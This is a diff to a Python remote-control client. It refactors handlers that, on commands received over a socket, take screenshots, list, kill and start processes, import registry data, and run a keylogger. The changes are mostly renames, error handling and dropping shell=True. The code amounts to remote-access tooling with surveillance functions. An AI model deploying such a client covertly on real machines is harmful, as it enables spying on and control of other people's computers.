@@ -103,7 +103,7 @@ class Client:
                 print(f'{self.addr} \tReceive: {flag}')
                 
                 if flag == 'screenshot':
-                    self.sendScreenShot()
+                    self.sendScreenshot()
                 elif flag == 'processlist':
                     self.sendProcessList()
                 elif flag == 'killprocess':
@@ -157,7 +157,7 @@ class Client:
 
     # cmd func
     def getResultCMD(self, cmd, headers):
-        lines = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+        lines = subprocess.Popen(cmd, stdout=subprocess.PIPE)
 
         firstLine = lines.stdout.readline().decode().rstrip()
         align = []
@@ -177,12 +177,13 @@ class Client:
         return result
 
     #  screenshot func
-    def sendScreenShot(self):
+    def sendScreenshot(self):
         print(f'{self.addr} \tSEND SCREENSHOT')
         try:
             image = ImageGrab.grab()
         except:
             image = None
+            print(f'{self.addr} \tError: Unable to take screenshot')
         
         self.sendDump(image)
 
@@ -194,33 +195,40 @@ class Client:
         # process_data = []
         # for process in f.Win32_Process(["ProcessId", "Name", "ThreadCount"]):
         #     process_data.append([process.ProcessId, process.Name, process.ThreadCount])
+        try:
+            process_data = self.getResultCMD('wmic process get description, processid, threadcount', ['Description', 'ProcessId', 'ThreadCount'])
+        except:
+            process_data = None
+            print(f'{self.addr} \tError: Unable to get process list')
 
-        process_data = self.getResultCMD('wmic process get description, processid, threadcount', ['Description', 'ProcessId', 'ThreadCount'])
         self.sendDump(process_data)
 
     # kill process func
     def getKillProcess(self):
-        pid = int(self.buff.recv_until(self.DELIM).decode())
-        print(f'{self.addr} \tKILL PROCESS {pid}')
-
+        print(f'{self.addr} \tKILL PROCESS')
+        pid = self.buff.recv_until(self.DELIM).decode()
+        
         try:
+            pid = int(pid)
             os.kill(pid, 9)
-            self.buff.send('OK'.encode() + self.DELIM)
         except:
             print(f'{self.addr} \t\tErr: Unable to kill {pid}')
             self.buff.send('ER'.encode() + self.DELIM)
+        else:
+            self.buff.send('OK'.encode() + self.DELIM)
 
     # start process func
     def getStartProcess(self):
+        print(f'{self.addr} \tSTART PROCESS')
         name = self.buff.recv_until(self.DELIM).decode()
-        print(f'{self.addr} \tSTART PROCESS {name}')
-
+        
         try:
             subprocess.Popen(name)
-            self.buff.send('OK'.encode() + self.DELIM)
         except:
             print(f'{self.addr} \t\tErr: Unable to start {name}')
             self.buff.send('ER'.encode() + self.DELIM)
+        else:
+            self.buff.send('OK'.encode() + self.DELIM)
 
     # keylogger func
     def keylogger_Server(self):
@@ -272,7 +280,7 @@ class Client:
             f.write(data)
             f.close()
 
-            res = subprocess.run(f'reg import \"{f.name}\"', shell = True, capture_output = True)
+            res = subprocess.run(f'reg import \"{f.name}\"', capture_output = True)
             os.remove(f.name)
             if res.stderr.decode().rstrip().find('ERROR') != -1:
                 raise Exception
